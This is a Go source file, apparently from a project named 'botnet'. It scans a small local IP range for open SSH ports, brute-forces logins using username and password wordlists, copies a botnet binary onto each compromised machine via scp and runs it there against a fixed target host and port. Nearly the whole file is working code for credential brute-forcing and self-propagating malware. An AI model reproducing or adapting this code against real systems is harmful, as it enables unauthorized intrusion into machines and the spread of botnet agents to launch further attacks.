package ssh

import (
	"fmt"
	"io/ioutil"
	"strings"

	"sync"

	"gitlab.com/rodzzlessa24/botnet/scanner"
	"golang.org/x/crypto/ssh"
)

// Attack holds all the shared properties needed to attack a SSH connection
type Attack struct {
	// UsernameFile is the path to usernames file
	UsernameFile string
	// PasswordFileis the path to password file
	PasswordFile string

	wg *sync.WaitGroup
}

type credential struct {
	username string
	password string
	host     string
	port     string
}

// Run is
func (a *Attack) Run() {
	if a.wg == nil {
		a.wg = new(sync.WaitGroup)
	}

	var hs []string

	for i := 0; i < 7; i++ {
		hs = append(hs, fmt.Sprintf("192.168.0.%d", i))
	}

	s := scanner.Scanner{}

	hosts := s.ScanHosts(hs)

	// check if ip address has port 22 for ssh
	for host := range hosts {
		port := strings.Split(host, ":")[1]
		addr := strings.Split(host, ":")[0]
		if port == "22" && addr != "192.168.0.2" {
			fmt.Println("[*] starting brute force for", host)
			a.wg.Add(1)
			go a.bruteForce(host)
		}
	}

	a.wg.Wait()
}

// BruteForce is
func (a *Attack) bruteForce(host string) {
	defer a.wg.Done()

	usernames, err := getContent(a.UsernameFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	passwords, err := getContent(a.PasswordFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	var found = false
	c := new(credential)
	for _, u := range usernames {
		found = false
		for _, p := range passwords {
			if err := a.login(host, u, p); err != nil {
				continue
			}
			c = &credential{
				username: u,
				password: p,
				host:     strings.Split(host, ":")[0],
				port:     strings.Split(host, ":")[1],
			}

			found = true
			break
		}

		if found {
			break
		}
	}

	if err := scp("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/linux/botnet", "/home/rodrigo/botnet/bin", c); err != nil {
		fmt.Println("[ERROR] sending botnet binary")
		return
	}

	sess, err := getSSHSession(c.host, c.username, c.password)
	if err != nil {
		fmt.Printf("[ERROR] creating ssh session %v\n", err)
		return
	}

	cmd := "/home/rodrigo/botnet/bin/botnet -target 192.168.0.2 -port 9999"

	if err := a.execute(cmd, sess); err != nil {
		fmt.Printf("[ERROR] executing botnet %v\n", err)
		return
	}
}

func (a *Attack) execute(cmd string, sess *ssh.Session) error {
	fmt.Println("[*] starting botnet on remote machine...")
	if err := sess.Run(cmd); err != nil {
		return err
	}

	return nil
}

// Login is
func (a *Attack) login(host, username, password string) error {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
	}

	_, err := ssh.Dial("tcp", host, config)
	if err != nil {
		return err
	}

	return nil
}

func getContent(file string) ([]string, error) {
	f, err := ioutil.ReadFile(file)
	if err != nil {
		return []string{}, fmt.Errorf("error opening file %v", err)
	}

	results := strings.Split(string(f), "\n")

	return results, nil
}

func getSSHSession(host, username, password string) (*ssh.Session, error) {
	fmt.Printf("[*] Creating SSH session to %s\n", host)
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
	}

	client, err := ssh.Dial("tcp", host+":22", config)
	if err != nil {
		return nil, err
	}

	// Create a new ssh session
	return client.NewSession()
}
